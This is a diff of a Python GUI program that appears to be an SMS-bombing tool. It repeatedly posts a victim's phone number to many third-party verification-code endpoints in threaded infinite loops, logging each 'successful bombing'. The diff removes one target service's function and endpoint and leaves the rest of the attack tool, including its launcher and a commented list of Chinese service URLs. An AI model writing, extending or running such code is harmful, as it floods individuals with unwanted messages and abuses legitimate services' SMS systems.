@@ -129,7 +129,6 @@ class Ui_MainWindow(object):
     #         '世界邦': 'http://is.shijiebang.com/vcode/apply/?callback=jQuery112409381263650192397_1555674316716&mobile=%s&_=1555674316718' % phone,
     #         '中金网': 'http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=%s&mbid=197873' % phone,
     #         '中华支教': 'http://www.cta613.org/sendsms.php',
-    #         '小麦助教': 'https://api-b.xiaomai5.com/b/send/authcode?p=w',
     #         '天津市市场监管委': 'http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login',
     #         '苏打校园': 'https://api.sodalife.xyz/v1/sms-codes',
     #         '松鼠办公':'http://www.superlgr.com/pptapi/_sendCode'
@@ -485,33 +484,6 @@ class Ui_MainWindow(object):
                 time.sleep(10)
                 continue
 
-    def boom12(self,phone):
-        while True:
-            try:
-                api = 'https://api-b.xiaomai5.com/b/send/authcode?p=w'
-                headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
-                }
-                data = requests.post(api, {'phone': phone},headers = headers).text
-                print(data)
-                data = json.loads(data)
-                if data['resultCode'] == 0:
-                    global boom_num
-                    boom_num = boom_num + 1
-                    print('小麦助教轰炸成功......\n')
-                    self.cursor.insertText('小麦助教轰炸成功......\n\n')
-                    time.sleep(30)
-                else:
-                    print(data['resultMsg'] + '......')
-                    self.cursor.insertText(data['resultMsg'] + '......')
-                    print('小麦助教短信发送失败......\n')
-                    self.cursor.insertText('小麦助教短信发送失败......\n\n')
-                    time.sleep(30)
-            except:
-                print('小麦助教轰炸出错......\n')
-                self.cursor.insertText('小麦助教轰炸出错\n\n')
-                time.sleep(10)
-                continue
 
     def boom13(self,phone):
         while True:
@@ -747,7 +719,7 @@ class Ui_MainWindow(object):
 
     def start_thread(self):
         phone = self.lineEdit.text()
-        boomlist = [self.boom1,self.boom2,self.boom3,self.boom4,self.boom5,self.boom6,self.boom7,self.boom8,self.boom9,self.boom10,self.boom11,self.boom12,self.boom13,self.boom14,self.boom15,self.boom16,self.boom17,self.boom18,self.boom19,self.boom20,self.boom21,]
+        boomlist = [self.boom1,self.boom2,self.boom3,self.boom4,self.boom5,self.boom6,self.boom7,self.boom8,self.boom9,self.boom10,self.boom11,self.boom13,self.boom14,self.boom15,self.boom16,self.boom17,self.boom18,self.boom19,self.boom20,self.boom21,]
         for boom in boomlist:
             self.th = threading.Thread(target = boom,args = (phone,))
             self.th.setDaemon(True)
